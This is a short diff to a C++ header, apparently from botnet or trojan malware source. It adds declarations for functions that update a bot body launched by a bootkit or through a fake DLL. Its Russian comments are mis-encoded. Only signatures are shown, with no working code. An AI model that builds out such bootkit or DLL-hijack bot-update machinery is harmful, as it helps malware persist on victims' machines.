@@ -273,6 +273,19 @@ namespace BOT
 	//  MakeUpdate - функци€ обновл€ет бота
 	//----------------------------------------------------
 	bool MakeUpdate(const char *FileName, bool ResetSettings);
+
+
+	#ifdef BOTPLUG
+		// ‘унк€ии лежат в модуле main.cpp bot.plug
+		//обновление тела бота, запускаемого буткитом
+		extern bool UpdateBotBootkit( BYTE* data, int c_data );
+		//обновление тела бота запускаемого через fake.dll
+		extern bool UpdateBotFakeDll( BYTE* data, int c_data );
+
+
+		// ‘ункци€ обновл€ет тело bot.plug
+		bool UpdateBotPlug(BYTE* data, int c_data);
+	#endif
 }
 
 //уид бота, инициализируетс€ в функции BOT::Initialize(), также мен€етс€ если будет изменен префикс 
